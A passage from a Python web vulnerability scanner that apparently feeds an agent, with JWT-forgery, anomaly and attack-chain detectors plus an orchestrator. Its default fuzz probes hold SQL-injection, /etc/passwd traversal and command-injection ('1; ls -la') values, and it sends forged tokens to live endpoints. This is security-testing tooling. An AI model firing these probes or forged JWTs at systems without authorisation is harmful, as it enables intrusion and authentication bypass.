            resp = await self.http.async_request("GET", endpoint, headers=headers)
            if resp is None:
                continue
            status = resp.get("status", 0)
            text = resp.get("text") or ""
            # Acceptance = response differs from baseline and is 2xx.
            accepted = 200 <= status < 300 and status != baseline_status
            if accepted:
                findings.append(Finding(
                    detector=self.name,
                    title=f"JWT algorithm confusion accepted: {name}",
                    severity=SeverityLevel.CRITICAL,
                    vuln_class=VulnClass.JWT,
                    url=endpoint,
                    payload=forged,
                    evidence=f"Server returned {status} (baseline {baseline_status}).",
                    description=(
                        "The verification endpoint accepted a forged JWT, "
                        "demonstrating an algorithm-confusion vulnerability. "
                        "Authentication is bypassed."
                    ),
                    remediation=(
                        "Reject unexpected alg values. Pin algorithms. Use "
                        "modern JWT libraries that enforce strict matching."
                    ),
                    cwe=["CWE-347", "CWE-287"],
                    references=["https://portswigger.net/web-security/jwt"],
                    confidence=0.95,
                    metadata={"attack": name, "status": status, "baseline": baseline_status},
                ))
        return findings


# ═══════════════════════════════════════════════════════════════════════════
#  9. SMART ANOMALY DETECTOR
# ═══════════════════════════════════════════════════════════════════════════


@dataclass
class ResponseSnapshot:
    """Compact snapshot of a response for anomaly comparison."""

    status: int
    length: int
    elapsed_ms: float
    headers: Dict[str, str]
    text: str

    @classmethod
    def from_response(cls, resp: Dict[str, Any]) -> "ResponseSnapshot":
        return cls(
            status=resp.get("status", 0),
            length=resp.get("length", 0),
            elapsed_ms=resp.get("elapsed_ms", 0.0),
            headers=dict(resp.get("headers") or {}),
            text=resp.get("text", ""),
        )


class SmartAnomalyDetector:
    """Statistical anomaly detection on responses.

    Builds a baseline (mean / stddev) of response length, headers, timing,
    and entropy over a small set of benign requests. Then runs a few probe
    requests and flags outliers using z-score and Shannon entropy analysis.
    """

    name = "smart_anomaly"

    def __init__(self, http: Optional[HTTPClient] = None):
        self.http = http or HTTPClient()

    async def detect(
        self,
        target: str,
        *,
        method: str = "GET",
        baseline_count: int = 5,
        probes: Optional[List[Dict[str, Any]]] = None,
        context: Optional[Dict[str, Any]] = None,
    ) -> List[Finding]:
        """Run anomaly detection.

        Args:
            target: URL.
            method: HTTP method.
            baseline_count: Number of baseline samples to gather.
            probes: Optional list of probe payloads. Each is a dict with
                optional ``params``, ``json_body``, ``data``, ``headers``.
                If ``None``, a small set of fuzz probes is used.
            context: Optional dict with base ``headers``.

        Returns:
            Findings list.
        """
        context = context or {}
        base_headers = context.get("headers") or {}

        baselines: List[ResponseSnapshot] = []
        for _ in range(max(2, baseline_count)):
            resp = await self.http.async_request(method, target, headers=base_headers)
            if resp is not None:
                baselines.append(ResponseSnapshot.from_response(resp))
        if len(baselines) < 2:
            return []

        findings: List[Finding] = []
        stats = self._stats(baselines)
        findings.extend(self._header_anomaly(target, baselines))
        findings.extend(self._timing_anomaly(target, baselines))

        probes = probes or [
            {"params": {"q": "' OR 1=1 --"}},
            {"params": {"q": "../../../../etc/passwd"}},
            {"params": {"callback": "alert(1)"}},
            {"params": {"id": "1; ls -la"}},
            {"params": {"debug": "1"}},
        ]
        for probe in probes:
            kwargs: Dict[str, Any] = {"headers": dict(base_headers)}
            kwargs.update({k: v for k, v in probe.items() if k != "headers"})
            if "headers" in probe and isinstance(probe["headers"], dict):
                kwargs["headers"].update(probe["headers"])
            resp = await self.http.async_request(method, target, **kwargs)
            if resp is None:
                continue
            snapshot = ResponseSnapshot.from_response(resp)
            anomaly = self._outlier(snapshot, stats)
            if anomaly is not None:
                findings.append(Finding(
                    detector=self.name,
                    title=f"Anomalous response to probe {probe}",
                    severity=SeverityLevel.MEDIUM,
                    vuln_class=VulnClass.ZERO_DAY,
                    url=target,
                    method=method,
                    payload=json.dumps(probe),
                    evidence=anomaly,
                    description=(
                        "Response to a fuzz probe is a statistical outlier "
                        "from the baseline. Could indicate WAF / error page "
                        "differences that lead to 0-day hypotheses."
                    ),
                    remediation="Investigate the parameter; potential input-validation gap.",
                    confidence=0.5,
                    metadata={"probe": probe, "snapshot": snapshot.__dict__},
                ))
        return findings

    @staticmethod
    def _stats(baselines: List[ResponseSnapshot]) -> Dict[str, Tuple[float, float]]:
        lengths = [b.length for b in baselines]
        timings = [b.elapsed_ms for b in baselines]
        statuses = [b.status for b in baselines]
        return {
            "length": (statistics.mean(lengths), statistics.pstdev(lengths) or 1.0),
            "timing": (statistics.mean(timings), statistics.pstdev(timings) or 1.0),
            "status_mean": (statistics.mean(statuses), 0.0),
        }

    @staticmethod
    def _header_anomaly(target: str, baselines: List[ResponseSnapshot]) -> List[Finding]:
        """Detect header-set differences across baseline responses.

        If the baseline responses have *different* header sets, the server is
        not deterministic — possibly a reverse proxy shuffle that complicates
        WAF bypass tracking.
        """
        keysets = {tuple(sorted(s.headers.keys())) for s in baselines}
        if len(keysets) > 1:
            return [Finding(
                detector="smart_anomaly",
                title="Non-deterministic response headers across baseline",
                severity=SeverityLevel.LOW,
                vuln_class=VulnClass.ZERO_DAY,
                url=target,
                evidence=f"{len(keysets)} distinct header sets observed.",
                description="Header set varies between identical baseline requests.",
                remediation="Audit reverse proxy configuration; pin header order.",
                confidence=0.6,
            )]
        return []

    @staticmethod
    def _timing_anomaly(target: str, baselines: List[ResponseSnapshot]) -> List[Finding]:
        timings = [b.elapsed_ms for b in baselines]
        if max(timings) - min(timings) > 1000:
            return [Finding(
                detector="smart_anomaly",
                title="Large timing variation across baseline requests",
                severity=SeverityLevel.LOW,
                vuln_class=VulnClass.ZERO_DAY,
                url=target,
                evidence=f"timing spread = {max(timings) - min(timings):.0f} ms",
                description="Identical baseline requests show > 1 s timing variation.",
                remediation="Profile server latency under load.",
                confidence=0.4,
            )]
        return []

    def _outlier(
        self,
        snapshot: ResponseSnapshot,
        stats: Dict[str, Tuple[float, float]],
    ) -> Optional[str]:
        msgs: List[str] = []
        # Length is a strong outlier signal; timing is noisy on small samples
        # so it needs a stricter threshold.
        length_stats = stats.get("length")
        if length_stats is not None:
            mean, std = length_stats
            value = snapshot.length
            z = (value - mean) / std if std > 0 else 0
            if abs(z) >= 3.0:
                msgs.append(f"length z={z:.1f} (mean={mean:.0f}, value={value})")
        timing_stats = stats.get("timing")
        if timing_stats is not None:
            mean, std = timing_stats
            value = snapshot.elapsed_ms
            z = (value - mean) / std if std > 0 else 0
            # Stricter threshold (>= 5) — small samples produce noisy z-scores.
            if abs(z) >= 5.0:
                msgs.append(f"timing z={z:.1f} (mean={mean:.0f}, value={value})")
        # Explicit 5xx flag (no z-score — server errors are always anomalies).
        if snapshot.status >= 500:
            msgs.append(f"status={snapshot.status} (server error)")
        # Status z-score against the baseline mean.
        status_stats = stats.get("status")
        if status_stats is not None:
            mean, std = status_stats
            z = (snapshot.status - mean) / std if std > 0 else 0
            if abs(z) >= 3.0:
                msgs.append(f"status z={z:.1f} (mean={mean:.0f}, value={snapshot.status})")
        # Entropy spike
        ent = _entropy(snapshot.text)
        baseline_ent = statistics.mean(_entropy(b.text) for b in [
            ResponseSnapshot(status=200, length=0, elapsed_ms=0, headers={}, text="x" * 200)
        ])
        if ent > 6.5 and abs(ent - baseline_ent) > 1.5:
            msgs.append(f"entropy={ent:.2f}")
        if not msgs:
            return None
        return "; ".join(msgs)


# ═══════════════════════════════════════════════════════════════════════════
#  10. FINDING GRAPH — VULNERABILITY-CHAIN CORRELATION
# ═══════════════════════════════════════════════════════════════════════════


@dataclass
class FindingNode:
    """A node in the finding graph (an endpoint, parameter, or finding)."""

    node_id: str
    kind: str  # "endpoint" | "parameter" | "finding"
    label: str
    metadata: Dict[str, Any] = field(default_factory=dict)


@dataclass
class FindingEdge:
    """A directed edge between two nodes."""

    src: str
    dst: str
    relation: str  # "has_parameter" | "exploits" | "chains_into" | "depends_on"
    metadata: Dict[str, Any] = field(default_factory=dict)


class FindingGraph:
    """Graph-based correlation of findings into attack chains.

    Nodes represent endpoints, parameters, and findings. Edges encode the
    relationship between them. The graph can be queried for *chains* that
    combine multiple findings (e.g. auth missing -> IDOR -> privilege
    escalation) and scored by impact rather than per-finding severity alone.
    """

    def __init__(self) -> None:
        self.nodes: Dict[str, FindingNode] = {}
        self.edges: List[FindingEdge] = []
        self._finding_counter = 0

    # ── Mutation API ───────────────────────────────────────────────────────

    def add_endpoint(self, url: str, method: str = "GET") -> str:
        """Register an endpoint node. Returns the node id."""
        node_id = f"ep:{method}:{url}"
        self.nodes.setdefault(node_id, FindingNode(
            node_id=node_id, kind="endpoint", label=url, metadata={"method": method},
        ))
        return node_id

    def add_parameter(self, endpoint_id: str, name: str) -> str:
        """Register a parameter under an endpoint node."""
        param_id = f"param:{endpoint_id}:{name}"
        self.nodes.setdefault(param_id, FindingNode(
            node_id=param_id, kind="parameter", label=name,
            metadata={"endpoint": endpoint_id},
        ))
        self._ensure_edge(endpoint_id, param_id, "has_parameter")
        return param_id

    def add_finding(self, finding: Finding) -> str:
        """Attach a finding to the graph. Returns the finding node id."""
        self._finding_counter += 1
        fid = f"finding:{self._finding_counter:04d}:{_short_hash(finding.title, finding.url)}"
        node = FindingNode(
            node_id=fid, kind="finding", label=finding.title,
            metadata={
                "vuln_class": finding.vuln_class.value,
                "severity": finding.severity.value,
                "url": finding.url,
                "method": finding.method,
                "parameter": finding.parameter,
                "confidence": finding.confidence,
            },
        )
        self.nodes[fid] = node
        if finding.url:
            endpoint_id = f"ep:{finding.method}:{finding.url}"
            if endpoint_id not in self.nodes:
                self.add_endpoint(finding.url, finding.method)
            self._ensure_edge(endpoint_id, fid, "exploits")
            if finding.parameter:
                param_id = f"param:{endpoint_id}:{finding.parameter}"
                if param_id not in self.nodes:
                    self.add_parameter(endpoint_id, finding.parameter)
                self._ensure_edge(param_id, fid, "exploits")
        return fid

    # ── Query API ──────────────────────────────────────────────────────────

    def chain_score(self, chain: Sequence[str]) -> float:
        """Score a chain by combining the severities of its member nodes.

        Score formula:

            score = sum(cvss(node)) * 1.5^(n - 1)

        (each additional finding in a chain amplifies the score by 50%).
        """
        if not chain:
            return 0.0
        total = 0.0
        for nid in chain:
            node = self.nodes.get(nid)
            if node is None:
                continue
            meta = node.metadata or {}
            sev = (meta.get("severity") or "medium").lower()
            floor = SEVERITY_CVSS_FLOOR.get(SeverityLevel(sev), 5.0)
            total += floor
        multiplier = 1.5 ** max(0, len(chain) - 1)
        return min(round(total * multiplier, 2), 10.0)

    def detect_chains(self) -> List[Dict[str, Any]]:
        """Find chains of length >= 2 that escalate to a high-impact node.

        Heuristic chain template::

            no_auth -> idor -> priv_esc (admin / RCE / mass-assignment)

        We group findings by (url, parameter) — across methods — and look for
        a triplet where at least one node matches a privilege-escalation
        keyword.
        """
        chains: List[Dict[str, Any]] = []
        findings = [n for n in self.nodes.values() if n.kind == "finding"]

        # Group findings by (url, parameter) — method is irrelevant for chains
        # because POST then GET is a valid attacker sequence.
        group_key: Dict[Tuple[str, str], List[str]] = collections.defaultdict(list)
        for f in findings:
            url = f.metadata.get("url", "")
            param = f.metadata.get("parameter", "") or ""
            key = (url, param)
            group_key[key].append(f.node_id)

        # Privilege escalation keyword set (lowercased substrings).
        priv_keys = (
            "admin", "priv_esc", "privilege", "rce",
            "mass assignment", "auth missing", "idor",
            "broken access", "deserialization", "template injection",
            "smuggling", "ssti", "race condition", "prototype",
        )
        for key, fids in group_key.items():
            if len(fids) < 2:
                continue
            # Sort findings by severity (highest first) so chains lead with the
            # strongest finding.
            fids_sorted = sorted(
                fids,
                key=lambda nid: SEVERITY_CVSS_FLOOR.get(
                    SeverityLevel(self.nodes[nid].metadata.get("severity", "medium")),
                    5.0,
                ),
                reverse=True,
            )
            # Generate chains of length 2 and 3 (length 1 is just a finding).
            for chain_len in (3, 2):
                if len(fids_sorted) < chain_len:
                    continue
                for chain in self._cartesian(fids_sorted, chain_len):
                    labels = [self.nodes[c].label.lower() for c in chain if c in self.nodes]
                    if any(k in l for l in labels for k in priv_keys):
                        chains.append({
                            "chain": chain,
                            "score": self.chain_score(chain),
                            "summary": " -> ".join(self.nodes[c].label for c in chain if c in self.nodes),
                        })
        # Deduplicate chains (same set of node ids)
        seen: set = set()
        unique: List[Dict[str, Any]] = []
        for ch in chains:
            key = tuple(sorted(ch["chain"]))
            if key in seen:
                continue
            seen.add(key)
            unique.append(ch)
        # Sort by chain score descending
        unique.sort(key=lambda c: c["score"], reverse=True)
        return unique

    @staticmethod
    def _cartesian(items: List[str], n: int) -> Iterable[List[str]]:
        """Generate combinations (with order) of length ``n`` from ``items``."""
        if n == 0:
            yield []
            return
        if n == 1:
            for it in items:
                yield [it]
            return
        for i, it in enumerate(items):
            for sub in FindingGraph._cartesian(items[i + 1:], n - 1):
                yield [it] + sub

    # ── Internals ──────────────────────────────────────────────────────────

    def _ensure_edge(self, src: str, dst: str, relation: str) -> None:
        for e in self.edges:
            if e.src == src and e.dst == dst and e.relation == relation:
                return
        self.edges.append(FindingEdge(src=src, dst=dst, relation=relation))

    def render(self) -> str:
        """Render the graph as a human-readable table (for debugging)."""
        lines = [f"Nodes: {len(self.nodes)}  Edges: {len(self.edges)}"]
        for n in self.nodes.values():
            lines.append(f"  [{n.kind:9}] {n.node_id}: {n.label}")
        for e in self.edges:
            lines.append(f"  {e.relation}: {e.src} -> {e.dst}")
        return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════════════
#  ZERO-DAY ENGINE — ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════


@dataclass
class ScanConfig:
    """User-tunable knobs for the engine."""

    enable_prototype: bool = True
    enable_mass_assignment: bool = True
    enable_deserialization: bool = True
    enable_smuggling: bool = True
    enable_race: bool = True
    enable_ssti: bool = True
    enable_graphql: bool = True
    enable_jwt: bool = True
    enable_anomaly: bool = True
    race_concurrency: int = 12
    anomaly_baseline: int = 5
    timeout: float = 8.0
    jwt_token: Optional[str] = None
    jwt_endpoint: Optional[str] = None
    graphql_endpoint: Optional[str] = None


class ZeroDayEngine:
    """Top-level orchestrator.

    Runs all enabled detectors and returns a deduplicated list of
    ``Finding`` objects that can be converted to ``VulnFinding`` for the
    rest of the framework.

    Usage::

        engine = ZeroDayEngine()
        findings = asyncio.run(engine.scan("https://target.example"))
        for f in findings:
            print(f.detector, f.title, f.severity.value)

    Args:
        config: Optional ``ScanConfig`` with per-detector toggles.
        http: Optional shared ``HTTPClient``. Created on demand if ``None``.
    """

    def __init__(
        self,
        config: Optional[ScanConfig] = None,
        http: Optional[HTTPClient] = None,
    ) -> None:
        self.config = config or ScanConfig()
        self.http = http or HTTPClient(timeout=self.config.timeout)
        self.graph = FindingGraph()
        self._detectors = self._build_detectors()

    # ── Detector registration ──────────────────────────────────────────────

    def _build_detectors(self) -> Dict[str, Any]:
        detectors: Dict[str, Any] = {}
        if self.config.enable_prototype:
            detectors["prototype"] = PrototypePollutionDetector(http=self.http)
        if self.config.enable_mass_assignment:
            detectors["mass_assignment"] = MassAssignmentDetector(http=self.http)
        if self.config.enable_deserialization:
            detectors["deserialization"] = InsecureDeserializationDetector(http=self.http)
        if self.config.enable_smuggling:
            detectors["smuggling"] = HTTPSmugglingDetector(timeout=self.config.timeout)
        if self.config.enable_race:
            detectors["race"] = RaceConditionDetector(http=self.http)
        if self.config.enable_ssti:
            detectors["ssti"] = SSTIDetector(http=self.http)
        if self.config.enable_graphql:
            detectors["graphql"] = GraphQLIntrospectionDetector(http=self.http)
        if not detectors:
            logger.warning("ZeroDayEngine: all detectors disabled; enabling defaults")
            detectors["prototype"] = PrototypePollutionDetector(http=self.http)
            detectors["mass_assignment"] = MassAssignmentDetector(http=self.http)
            detectors["deserialization"] = InsecureDeserializationDetector(http=self.http)
            detectors["smuggling"] = HTTPSmugglingDetector(timeout=self.config.timeout)
            detectors["race"] = RaceConditionDetector(http=self.http)
            detectors["ssti"] = SSTIDetector(http=self.http)
            detectors["graphql"] = GraphQLIntrospectionDetector(http=self.http)
        return detectors

    # ── Public API ─────────────────────────────────────────────────────────

    async def scan(self, target: str) -> List[Finding]:
        """Run every enabled detector against ``target``.

        Args:
            target: URL or base URL to scan.

        Returns:
            List of deduplicated ``Finding`` objects, ordered by severity
            (Critical first, Info last).
        """
        findings: List[Finding] = []
        console.print(f"[bold #ffffff]{ZeroDayEngine.__name__}[/bold #ffffff] "
                      f"starting scan on {target}")

        # ── Detectors that need an HTTP client ────────────────────────────
        net_tasks: List[Awaitable[List[Finding]]] = []
        net_tasks.append(self._run_prototype(target))
        net_tasks.append(self._run_mass_assignment(target))
        net_tasks.append(self._run_deserialization(target))
        net_tasks.append(self._run_smuggling(target))
        net_tasks.append(self._run_race(target))
        net_tasks.append(self._run_ssti(target))
        net_tasks.append(self._run_graphql(target))
        net_tasks.append(self._run_anomaly(target))

        results = await asyncio.gather(*net_tasks, return_exceptions=True)
        for res in results:
            if isinstance(res, Exception):
                logger.warning("detector raised: %s", res)
                continue
            findings.extend(res)

        # ── Static JWT forgery (no network required) ─────────────────────
        if self.config.enable_jwt:
            jwt_det = JWTAlgorithmDetector(http=self.http)
            # Mark all static candidates as untested
            static_candidates = jwt_det.detect(self.config.jwt_token)
            findings.extend(static_candidates)

            # Try live detection against any endpoint that returns a JWT
            discovered_endpoints = await self._discover_jwt_endpoints(target)
            for ep in discovered_endpoints[:5]:  # cap to avoid spam
                live = await jwt_det.detect_on_endpoint(
                    ep,
                    original_token=self.config.jwt_token,
                )
                findings.extend(live)

        # ── Deduplicate and order ─────────────────────────────────────────
        deduped = self._deduplicate(findings)
        deduped.sort(key=self._severity_rank, reverse=True)

        # ── Populate finding graph ───────────────────────────────────────
        for f in deduped:
            self.graph.add_finding(f)

        console.print(
            f"[bold #ffffff]ZeroDayEngine[/bold #ffffff] completed: "
            f"[OK] {len(deduped)} unique findings."
        )
        return deduped

    async def scan_as_vulns(self, target: str) -> List[VulnFinding]:
        """Convenience wrapper that returns ``VulnFinding`` objects."""
        return [f.to_vuln_finding() for f in await self.scan(target)]

    # ── Detector runner helpers ────────────────────────────────────────────

    async def _discover_jwt_endpoints(self, target: str) -> List[str]:
        """Auto-discover endpoints that return JWTs (for live JWT testing).

        Returns list of URL strings where a JWT was found in the response.
        """
        candidates: List[str] = []
        # Common auth-ish paths to probe
        paths = [
            "/", "/api", "/api/v1", "/api/v1/auth", "/api/v2/auth",
            "/auth", "/login", "/token", "/api/token", "/oauth/token",
            "/.well-known/openid-configuration", "/jwks.json",
            "/api/user", "/api/me", "/api/users/me",
            "/graphql", "/api/graphql",
        ]
        for p in paths:
            url = target.rstrip("/") + p
            try:
                resp = await self.http.async_request("GET", url, timeout=5.0)
                if not resp:
                    continue
                # Check Authorization-style headers in response
                for h_name, h_val in (resp.get("headers") or {}).items():
                    if h_name.lower() in ("authorization", "set-cookie", "x-auth-token"):
                        if "bearer" in h_val.lower() or self._looks_like_jwt(h_val):
                            candidates.append(url)
                            break
                # Check response body for JWT patterns
                body = (resp.get("text") or "")[:8000]
                if self._looks_like_jwt(body):
                    candidates.append(url)
            except Exception:
                continue
        return list(dict.fromkeys(candidates))  # dedupe, preserve order

    @staticmethod
    def _looks_like_jwt(text: str) -> bool:
        """Heuristic: does this string contain a JWT-looking pattern?"""
        import re
        if not text:
            return False
        # JWT: three base64url segments separated by dots
        return bool(re.search(
            r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+",
            text,
        ))

    async def _run_prototype(self, target: str) -> List[Finding]:
        if "prototype" not in self._detectors:
            return []
        return await self._detectors["prototype"].detect(target)

    async def _run_mass_assignment(self, target: str) -> List[Finding]:
        if "mass_assignment" not in self._detectors:
            return []
        return await self._detectors["mass_assignment"].detect(target)

    async def _run_deserialization(self, target: str) -> List[Finding]:
        if "deserialization" not in self._detectors:
            return []
        return await self._detectors["deserialization"].detect(target)

    async def _run_smuggling(self, target: str) -> List[Finding]:
        if "smuggling" not in self._detectors:
            return []
        return await self._detectors["smuggling"].detect(target)

    async def _run_race(self, target: str) -> List[Finding]:
        if "race" not in self._detectors:
            return []
        return await self._detectors["race"].detect(
            target, concurrency=self.config.race_concurrency,
        )

    async def _run_ssti(self, target: str) -> List[Finding]:
        if "ssti" not in self._detectors:
            return []
        return await self._detectors["ssti"].detect(target)

    async def _run_graphql(self, target: str) -> List[Finding]:
        if "graphql" not in self._detectors:
            return []
        ctx: Dict[str, Any] = {}
        if self.config.graphql_endpoint:
            ctx["endpoint"] = self.config.graphql_endpoint
        return await self._detectors["graphql"].detect(target, context=ctx or None)

    async def _run_anomaly(self, target: str) -> List[Finding]:
        if not self.config.enable_anomaly:
            return []
        detector = SmartAnomalyDetector(http=self.http)
        return await detector.detect(
            target, baseline_count=self.config.anomaly_baseline,
        )

    # ── Utilities ──────────────────────────────────────────────────────────

    @staticmethod
    def _severity_rank(f: Finding) -> int:
        return {
            SeverityLevel.CRITICAL: 5,
            SeverityLevel.HIGH:     4,
            SeverityLevel.MEDIUM:   3,
            SeverityLevel.LOW:      2,
            SeverityLevel.INFO:     1,
        }.get(f.severity, 0)

    @staticmethod
    def _deduplicate(findings: List[Finding]) -> List[Finding]:
        seen: set = set()
        out: List[Finding] = []
        for f in findings:
            key = _short_hash(
                f.detector, f.vuln_class.value, f.url, f.method,
                f.parameter, f.title.lower(),
            )
            if key in seen:
                continue
            seen.add(key)
            out.append(f)
        return out

    # ── Lifecycle ──────────────────────────────────────────────────────────

    def close(self) -> None:
        """Release resources held by the engine."""
        try:
            self.http.close()
        except Exception:  # pragma: no cover - best effort
            pass


# ═══════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════


async def run_zero_day_scan(target: str, **kwargs: Any) -> List[VulnFinding]:
    """Convenience entry point used by other tools / agent brain.

    Args:
        target: URL or base URL to scan.
        **kwargs: Forwarded to ``ScanConfig``.

    Returns:
        List of ``VulnFinding`` objects.
    """
    config = ScanConfig(**{k: v for k, v in kwargs.items() if hasattr(ScanConfig, k)})
    engine = ZeroDayEngine(config=config)
    try:
        return await engine.scan_as_vulns(target)
    finally:
        engine.close()


__all__ = [
    "SeverityLevel",
    "SEVERITY_CVSS_FLOOR",
    "Finding",
    "HTTPClient",
    "PrototypePollutionDetector",
    "MassAssignmentDetector",
    "InsecureDeserializationDetector",
    "HTTPSmugglingDetector",
    "RaceConditionDetector",
    "SSTIDetector",
    "GraphQLIntrospectionDetector",
    "JWTAlgorithmDetector",
    "SmartAnomalyDetector",
    "FindingGraph",
    "FindingNode",
    "FindingEdge",
    "ScanConfig",
    "ZeroDayEngine",
    "run_zero_day_scan",
]


if __name__ == "__main__":  # pragma: no cover - manual smoke
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"
    asyncio.run(run_zero_day_scan(target))
